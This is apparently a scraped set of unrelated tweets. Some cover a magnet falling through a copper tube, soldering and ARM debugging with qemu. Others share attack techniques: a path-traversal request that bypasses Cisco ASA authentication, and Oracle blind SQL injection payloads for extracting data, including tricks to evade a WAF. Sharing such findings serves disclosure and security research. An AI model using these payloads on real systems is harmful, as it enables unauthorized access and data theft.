Dropping A Magnet Through A Copper Tube:

As the magnet falls it induces a current in the copper pipe

That current creates a magnetic field that opposes the changing field of the falling magnet, resulting in the magnet being repelled (falling more slowly)

Lenz’s Lawpic.twitter.com/O78tzvG3qb

1005554765705687040.text:
Cisco recently fixed a bug I reported in ASA, see: https://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-20180606-asaftd …
The root cause of the issue: URLs under /+CSCOE+/ require authentication. URLs under /+CSCOU+/ don't.

So how to access /+CSCOE+/ without authentication?

GET /+CSCOU+/../+CSCOE+/<whatever> HTTP/1.1
;-)

Debugging arm apps with just qemu (no VM):
1. qemu-arm-static -L /usr/arm-linux-gnueabi/ -g 1234 ../vuln &
2. Install pwndbg (https://github.com/bkerler/pwndbg  for add. fixes) or gef
3. gdb-multiarch ../vuln
    In GDB: set endian little, set architecture arm, target remote :1234
Have fun!

1039781636492222464.text:
The problem is that the WAF catches the multiple spaces in the innermost select, since there are more than one between SELECT and FROM. This gets around that:
SELECT(ROWNUM)r,(username)FROM all_users

1039772089308393472.text:
Sigh! Turns out this fails for ROWNUM>1! 
This does work, though:
SELECT COUNT(*) FROM all_source
WHERE ROWNUM < (
  SELECT ASCII(SUBSTR(username,1,1)) FROM (
    SELECT username FROM (
      SELECT ROWNUM r,username FROM all_users
    )
    WHERE r=23
  )
)
But WAF catches it

1039586289237061639.text:
That is:
“SELECT(x)FROM DUAL” 
got past the WAF successfully.

1039527341347819520.text:
Fun fact: this instance was protected by a WAF that was blocking multiple "spaces" between "SELECT" and "FROM". 
i.e. 
"SELECTx FROM" -> stacktrace
"SELECT xFROM" -> stacktrace
"SELECT x FROM" -> blocked 
Avoided by surrounding the expression with parentheses instead of spaces.

1039526149037203456.text: In other words, SELECT COUNT(*) FROM sys.all_source WHERE ROWNUM <= ASCII("A") <- returns 65, revealing that the character in question is an "A"

1039524789604560896.text:
Technique for exfil in SELECT COUNT(*) FROM <inject here> (Oracle):
<sys.all_source WHERE ROWNUM <= (SELECT(ASCII(SUBSTR(COLUMN_NAME,y,1)))FROM TABLE_NAME WHERE ROWNUM=x)>
Iterate over x and y as needed.
Start each new x with query for LENGTH(COLUMN_NAME) for range of y.

952608499095228422.text: The smaller the component, the easier it is to heat up the other side that you already soldered, and unsolder it again. So aim for as little heat as possible, I guess!
